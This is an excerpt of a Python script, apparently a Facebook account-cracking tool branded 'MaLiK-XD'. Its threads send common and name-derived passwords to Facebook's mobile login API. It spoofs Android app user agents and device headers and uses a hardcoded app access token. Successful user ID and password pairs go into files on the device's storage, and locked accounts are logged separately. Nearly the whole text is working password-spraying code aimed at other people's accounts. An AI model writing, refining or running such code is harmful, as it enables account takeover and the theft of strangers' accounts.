...
def rnd():
	...
	with tred(max_workers=30) as khan:
		...
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'pak12345','last9','last8','first6','078600','07860786','112200','112244','112255','112266','708090']
...
def api(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [MaLiK-XD]  %s|\033[1;37m  OK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			fbmf = 'samsung'
			fbbd = 'samsung'
			ua = 'Davik/2.6.0 (Linux; U; Android '+str(random.randint(4,13))+'.0; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/en_GB;FBBV/'+fbbv+';FBCR/null;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/'+fbrv+';]'
			...
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'es_ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			...
			if 'session_key' in po:
				...
				open(f'/sdcard/MaLiK-CP.txt', 'a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write(f'\r\r\033[1;37m [MaLiK-XD]  %s|\033[1;37m  OK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			...
			ua = 'Davik/2.6.0 (Linux; U; Android '+str(random.randint(4,13))+'.0; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/en_GB;FBBV/'+fbbv+';FBCR/null;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/'+fbrv+';]'
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'en_GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post("https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true",data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [MaLiK-OK] '+uid+' | '+pas)
				open('/sdcard/MaLiK-R-OK.txt','a').write(uid+'|'+pas+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
